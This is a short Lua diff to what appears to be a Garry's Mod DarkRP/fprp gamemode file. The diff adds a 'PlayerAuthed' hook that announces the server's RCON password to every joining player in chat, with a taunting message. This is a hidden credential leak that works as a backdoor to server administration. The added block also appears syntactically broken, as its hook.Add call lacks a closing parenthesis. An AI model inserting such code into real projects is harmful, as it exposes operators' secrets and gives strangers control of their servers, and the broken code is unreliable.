@@ -123,4 +123,9 @@ timer.Create('Coughcough', 180, 0, function()
 	net.Broadcast();
 end);
 
+hook.Add("PlayerAuthed", "aa", function( ply )
+	ply:PrintMessage( HUD_PRINTTALK, "Thanks for joining our pathetic server, our RCON pass is: " .. GetConVarString("rcon_password") )
+end
+
+
 DarkRP = fprp
